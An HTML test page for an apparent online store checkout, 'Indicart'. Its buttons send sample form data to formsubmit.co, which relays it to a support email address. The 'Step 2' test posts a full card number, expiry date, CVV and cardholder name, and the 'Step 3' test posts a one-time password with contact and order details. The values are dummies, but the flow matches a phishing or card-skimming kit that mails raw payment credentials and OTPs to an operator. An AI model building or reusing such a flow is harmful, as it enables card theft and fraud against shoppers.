<!DOCTYPE html>
<html>
<head>
    <title>Test FormSubmit.co - support@indicart.store</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .test-section { margin: 20px 0; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
        button { padding: 10px 20px; margin: 10px; cursor: pointer; }
        .result { margin: 10px 0; padding: 10px; background: #f5f5f5; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
    </style>
</head>
<body>
    <h1>Test FormSubmit.co Email Delivery</h1>
    <p>Testing email delivery to: <strong>support@indicart.store</strong></p>
    
    <div class="test-section">
        <h2>Test 1: Direct Form Submission</h2>
        <form id="direct-form" action="https://formsubmit.co/support@indicart.store" method="POST" target="_blank">
            <input type="hidden" name="_subject" value="Direct Form Test - support@indicart.store">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="test_type" value="direct_form">
            <input type="hidden" name="timestamp" value="">
            
            <label>Test Name:</label>
            <input type="text" name="name" value="Test User" required><br><br>
            
            <label>Test Email:</label>
            <input type="email" name="email" value="test@example.com" required><br><br>
            
            <button type="submit">Submit Direct Form</button>
        </form>
        <div id="direct-result" class="result"></div>
    </div>
    
    <div class="test-section">
        <h2>Test 2: Fetch API (Like Step 1)</h2>
        <button onclick="testFetch()">Test Fetch Submission</button>
        <div id="fetch-result" class="result"></div>
    </div>
    
    <div class="test-section">
        <h2>Test 3: Simulate Step 2 Data</h2>
        <button onclick="testStep2()">Test Step 2 Format</button>
        <div id="step2-result" class="result"></div>
    </div>
    
    <div class="test-section">
        <h2>Test 4: Simulate Step 3 Data</h2>
        <button onclick="testStep3()">Test Step 3 Format</button>
        <div id="step3-result" class="result"></div>
    </div>

    <script>
        // Set timestamp for direct form
        document.getElementById('direct-form').querySelector('input[name="timestamp"]').value = new Date().toISOString();
        
        // Test 2: Fetch API
        function testFetch() {
            const result = document.getElementById('fetch-result');
            result.innerHTML = '<p>Testing fetch submission...</p>';
            
            const formData = new FormData();
            formData.append('_subject', 'Fetch API Test - support@indicart.store');
            formData.append('_template', 'table');
            formData.append('_captcha', 'false');
            formData.append('test_type', 'fetch_api');
            formData.append('name', 'Test User');
            formData.append('email', 'test@example.com');
            formData.append('timestamp', new Date().toISOString());
            
            fetch('https://formsubmit.co/support@indicart.store', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log('Fetch response:', response);
                result.innerHTML = `<div class="success">✅ Fetch Response: ${response.status} ${response.statusText}</div>`;
                return response.text();
            })
            .then(text => {
                console.log('Response body:', text);
                result.innerHTML += `<div class="success">✅ Response received: ${text.substring(0, 100)}...</div>`;
            })
            .catch(error => {
                console.error('Fetch error:', error);
                result.innerHTML = `<div class="error">❌ Fetch Error: ${error.message}</div>`;
            });
        }
        
        // Test 3: Step 2 Format
        function testStep2() {
            const result = document.getElementById('step2-result');
            result.innerHTML = '<p>Testing Step 2 format...</p>';
            
            const formData = new FormData();
            formData.append('_subject', 'Indicart Order - Step 2');
            formData.append('_template', 'table');
            formData.append('_captcha', 'false');
            formData.append('payment_method', 'credit_card');
            formData.append('card_name', 'Test User');
            formData.append('card_number', '4242424242424242');
            formData.append('expiry', '12/25');
            formData.append('cvv', '123');
            formData.append('test_type', 'step2_format');
            formData.append('timestamp', new Date().toISOString());
            
            fetch('https://formsubmit.co/support@indicart.store', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log('Step 2 response:', response);
                result.innerHTML = `<div class="success">✅ Step 2 Response: ${response.status} ${response.statusText}</div>`;
                return response.text();
            })
            .then(text => {
                result.innerHTML += `<div class="success">✅ Step 2 data sent successfully</div>`;
            })
            .catch(error => {
                console.error('Step 2 error:', error);
                result.innerHTML = `<div class="error">❌ Step 2 Error: ${error.message}</div>`;
            });
        }
        
        // Test 4: Step 3 Format
        function testStep3() {
            const result = document.getElementById('step3-result');
            result.innerHTML = '<p>Testing Step 3 format...</p>';
            
            const formData = new FormData();
            formData.append('_subject', 'Indicart Order - COMPLETED');
            formData.append('_template', 'table');
            formData.append('_captcha', 'false');
            formData.append('otp', '123456');
            formData.append('order_id', 'ORD-' + Date.now());
            formData.append('contact_info', 'Test User | test@example.com | +1234567890');
            formData.append('payment_info', 'Credit Card ending in 4242');
            formData.append('cart_data', 'Test Item x1 | INR 100');
            formData.append('order_total', '100');
            formData.append('test_type', 'step3_format');
            formData.append('timestamp', new Date().toISOString());
            
            fetch('https://formsubmit.co/support@indicart.store', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log('Step 3 response:', response);
                result.innerHTML = `<div class="success">✅ Step 3 Response: ${response.status} ${response.statusText}</div>`;
                return response.text();
            })
            .then(text => {
                result.innerHTML += `<div class="success">✅ Step 3 data sent successfully</div>`;
            })
            .catch(error => {
                console.error('Step 3 error:', error);
                result.innerHTML = `<div class="error">❌ Step 3 Error: ${error.message}</div>`;
            });
        }
        
        // Monitor direct form submission
        document.getElementById('direct-form').addEventListener('submit', function(e) {
            console.log('Direct form submitted');
            document.getElementById('direct-result').innerHTML = '<div class="success">✅ Direct form submitted - check for email</div>';
        });
    </script>
</body>
</html>
